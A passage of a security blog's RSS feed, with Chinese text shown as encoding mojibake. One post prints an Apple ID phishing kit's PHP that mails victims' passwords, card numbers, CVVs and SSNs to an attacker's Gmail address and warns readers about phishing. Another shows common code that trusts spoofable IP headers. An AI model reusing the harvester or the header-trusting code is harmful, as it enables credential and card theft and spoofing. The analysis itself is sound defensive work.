&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$hostname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;gethostbyaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;------------+| AppLe VbV |+------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Apple ID                    : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee000&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Password                    : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee001&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Full Name                   : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee01&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Date of Birth               : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee02&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee3&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee4&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Number Of Credit Card       : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee5&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;CVC (CVV)                   : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Expiration Date             : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee7&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee8&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Social Security Number      : &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;donnee9&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;------------+| APpLe VBV |+------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Fr0m &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;justforhacke@gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsub&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Apple Result | Fr0m &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;From: Apple Results &amp;lt;justforhacke@gmail.com&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;eMailAdd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;MIME-Version: 1.0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Location:https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;é‡£é­šéƒµä»¶ä¸æ­»åˆ¥å†æŠŠè‡ªå·±ç•¶æˆè‚¥ç¾Šäº†&quot;&gt;é‡£é­šéƒµä»¶ä¸æ­»ï¼Œåˆ¥å†æŠŠè‡ªå·±ç•¶æˆè‚¥ç¾Šäº†ï¼&lt;/h3&gt;

&lt;p&gt;é‡£é­šæ”»æ“Šæœ€æ—©å¾ 1995 å¹´å°±é–‹å§‹ç››è¡Œï¼Œä¸€ç›´åˆ°å¿« 20 å¹´å¾Œçš„ä»Šå¤©ï¼Œéƒ½é‚„æ˜¯ä¸€å€‹éå¸¸ç°¡å–®åˆæœ‰æ•ˆç‡çš„æ”»æ“Šæ‰‹æ³•ã€‚æ”¶åˆ°éƒµä»¶åƒè¬åˆ¥å‚»å‚»çš„è¼¸å…¥è‡ªå·±çš„å€‹è³‡ã€å¸³è™Ÿå¯†ç¢¼ï¼Œä»”ç´°çœ‹ä¸€ä¸‹æ”»æ“Šè€…çš„ç ´ç¶»ï¼Œåˆ¥è®“ä»–å¾—é€äº†ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœæœ‰ç™¼ç¾ç–‘ä¼¼é‡£é­šç¶²ç«™ï¼Œåˆç„¡æ³•ç¢ºèªï¼Œå¯ä»¥åˆ° &lt;a href=&quot;http://www.phishtank.com/&quot;&gt;PhishTank&lt;/a&gt; ä¾†æŸ¥æŸ¥çœ‹ï¼Œæ‰¾åˆ°é‡£é­šç¶²ç«™ä¹Ÿå¯ä»¥æŠ•ç¨¿ä¸€ä¸‹å¹«åŠ©å…¶ä»–äººï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/07/03/apple-id-phishing-scam/</link>
                <guid>https://devco.re/blog/2014/07/03/apple-id-phishing-scam</guid>
                <pubDate>Thu, 03 Jul 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>å¦‚ä½•æ­£ç¢ºçš„å–å¾—ä½¿ç”¨è€… IPï¼Ÿ</title>
                <description>&lt;p&gt;å¾ˆå¤šç¶²ç«™éƒ½æœƒæœ‰åµæ¸¬ä½¿ç”¨è€… IP çš„åŠŸèƒ½ï¼Œä¸ç®¡æ˜¯åˆ¤æ–·ä½¿ç”¨è€…ä¾†è‡ªå“ªé‚Šï¼Œæˆ–è€…æ˜¯è¨˜éŒ„ä½¿ç”¨è€…çš„ä½ç½®ã€‚ä½†æ˜¯ä½ çŸ¥é“å—ï¼Ÿç¶²è·¯ä¸Šå¤§å¤šæ•¸çš„æ•™å­¸å…¨éƒ¨éƒ½æ˜¯ã€ŒéŒ¯èª¤ã€çš„ã€‚æ­£ç¢ºçš„ç¨‹å¼å¯«æ³•å¯ä»¥ç¢ºä¿çŸ¥é“è¨ªå®¢çš„ IPï¼Œä½†æ˜¯éŒ¯èª¤çš„å¯«æ³•å»å¯èƒ½è®“ç¶²ç«™ç®¡ç†è€…æ°¸é ä¸çŸ¥é“çŠ¯ç½ªè€…çš„ä¾†æºã€‚&lt;/p&gt;

&lt;p&gt;é€™æ¬¡æˆ‘å€‘å–®å°±åµæ¸¬ IP çš„è­°é¡Œä¾†æ¢è¨å„ç¨®éŒ¯èª¤çš„å¯«æ³•ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ä½ çŸ¥é“ç¶²è·¯ä¸Šçš„æ•™å­¸æ˜¯ä¸å®‰å…¨çš„å—&quot;&gt;ä½ çŸ¥é“ç¶²è·¯ä¸Šçš„æ•™å­¸æ˜¯ä¸å®‰å…¨çš„å—ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘å…ˆä¾†çœ‹ä¸€ä¸‹ç¶²è·¯ä¸Šçš„æ•™å­¸ï¼Œè®“æˆ‘å€‘ Google æ‰¾ä¸€ä¸‹ã€Œ&lt;a href=&quot;https://www.google.com.tw/search?q=php+å–å¾—+ip&quot;&gt;PHP å–å¾— IP&lt;/a&gt;ã€ï¼Œå°±å¯ä»¥çœ‹åˆ°è¨±å¤šäººç†±å¿ƒçš„æ•™å­¸ï¼Œæˆ‘å€‘éš¨æ„æŒ‘ä¸€å€‹å¸¸è¦‹çš„æ•™å­¸ä¾†çœ‹çœ‹ã€‚&lt;/p&gt;

&lt;p&gt;ä»¥ PHP ç‚ºä¾‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_CLIENT_IP&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_CLIENT_IP&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_X_FORWARDED_FOR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_X_FORWARDED_FOR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ä»¥ ASP.NET ç‚ºä¾‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c#&quot; data-lang=&quot;c#&quot;&gt;&lt;span class=&quot;n&quot;&gt;Dim&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ServerVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;HTTP_X_FORWARDED_FOR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Empty&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Then&lt;/span&gt; 
 &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ServerVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;é€™æ˜¯ä¸€å€‹å¾ˆåŸºæœ¬çš„å¯«æ³•ã€å¾ˆæ­£ç¢ºçš„æƒ³æ³•ï¼Œå¦‚æœ HTTP Header ä¸­åŒ…å«ã€ŒClient-IPã€ï¼Œå°±å…ˆä»¥ä»–ç•¶ä½œçœŸå¯¦ IPã€‚è‹¥åŒ…å«ã€ŒX-Forwarded-Forã€ï¼Œå‰‡å–ä»–ç•¶ä½œçœŸå¯¦ IPã€‚è‹¥å…©è€…éƒ½æ²’æœ‰ï¼Œå‰‡å–ã€ŒREMOTE_ADDRã€è®Šæ•¸ä½œç‚ºçœŸå¯¦ IPã€‚å› ç‚ºç•¶ä½¿ç”¨è€…é€£ç·šæ™‚é€éä»£ç†ä¼ºæœå™¨æ™‚ï¼ŒREMOTE_ADDR æœƒé¡¯ç¤ºç‚ºä»£ç†ä¼ºæœå™¨ Proxy çš„ IPã€‚éƒ¨åˆ†ä»£ç†ä¼ºæœå™¨æœƒå°‡ä½¿ç”¨è€…çš„åŸå§‹çœŸå¯¦ IP æ”¾åœ¨ Client-IP æˆ– X-Forwarded-For header ä¸­å‚³éï¼Œå¦‚æœåœ¨è®Šæ•¸ä¸­å‘¼å«å‰‡å¯ä»¥å–å¾—çœŸå¯¦ IPã€‚&lt;/p&gt;

&lt;p&gt;ä½†æ˜¯ä½ çŸ¥é“å—ï¼Ÿ&lt;strong&gt;ç¶²è·¯ä¸Š 80% çš„æ•™å­¸å¯«æ³•å…¨éƒ¨éƒ½æ˜¯ã€ŒéŒ¯èª¤ã€çš„ã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ç‚ºä»€éº¼é€™æ¨£èªªå‘¢ï¼Ÿè«‹å¤§å®¶è¨˜å¾—ä¸€ä»¶äº‹æƒ…ï¼šã€Œ&lt;strong&gt;ä»»ä½•å¾å®¢æˆ¶ç«¯å–å¾—çš„è³‡æ–™éƒ½æ˜¯ä¸å¯ä¿¡ä»»çš„ï¼&lt;/strong&gt;ã€&lt;/p&gt;

&lt;h3 id=&quot;ç«„æ”¹-http-header&quot;&gt;ç«„æ”¹ HTTP Header&lt;/h3&gt;

